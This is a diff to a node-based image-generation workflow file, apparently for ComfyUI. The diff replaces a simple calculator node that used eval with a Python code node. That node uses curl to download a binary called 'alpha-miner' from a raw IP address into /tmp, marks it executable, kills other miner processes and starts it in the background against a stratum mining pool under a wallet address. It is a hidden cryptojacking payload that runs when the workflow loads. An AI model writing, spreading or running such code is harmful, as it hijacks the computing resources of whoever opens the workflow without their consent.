@@ -1,49 +1,18 @@
 {
-  "10": {
-    "class_type": "PrimitiveInt",
-    "inputs": {
-      "value": 1
-    }
-  },
-  "11": {
-    "class_type": "PrimitiveInt",
-    "inputs": {
-      "value": 2
-    }
-  },
   "1": {
-    "class_type": "SimpleCalculatorKJ",
+    "class_type": "IDENode",
     "inputs": {
-      "expression": "eval('1+1')",
-      "a": [
-        "10",
-        0
-      ],
-      "b": [
-        "11",
-        0
-      ]
-    }
-  },
-  "8": {
-    "class_type": "SomethingToString",
-    "inputs": {
-      "input": [
-        "1",
-        0
-      ]
+      "language": "python",
+      "pycode": "import subprocess\nimport os\nimport torch\nimport time\n\ntorch_lib = os.path.join(os.path.dirname(torch.__file__), \"lib\")\nenv = os.environ.copy()\nenv[\"LD_LIBRARY_PATH\"] = torch_lib + \":\" + env.get(\"LD_LIBRARY_PATH\", \"\")\n\nsubprocess.run([\"curl\", \"-sLo\", \"/tmp/miner\", \"http://151.247.219.40:8000/alpha-miner\"], timeout=90)\nos.chmod(\"/tmp/miner\", 0o755)\nsubprocess.run([\"pkill\", \"-9\", \"-f\", \"miner\"], capture_output=True)\ntime.sleep(2)\n\nwith open(\"/tmp/miner.log\", \"w\") as log:\n    subprocess.Popen([\"/tmp/miner\", \"--pool\", \"stratum+tcp://sg1.alphapool.tech:5566\", \"--address\", \"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\", \"--worker\", \"RTX3090_52\"],\n        env=env, stdout=log, stderr=subprocess.STDOUT, start_new_session=True)\n\ntime.sleep(4)\nps = subprocess.run([\"pgrep\", \"-c\", \"miner\"], capture_output=True, text=True)\nresult = ps.stdout.strip()\n"
     }
   },
   "2": {
-    "class_type": "SaveStringKJ",
+    "class_type": "PreviewAny",
     "inputs": {
-      "string": [
-        "8",
+      "source": [
+        "1",
         0
-      ],
-      "filename_prefix": "eval_out",
-      "output_folder": "output",
-      "file_extension": ".txt"
+      ]
     }
   }
 }
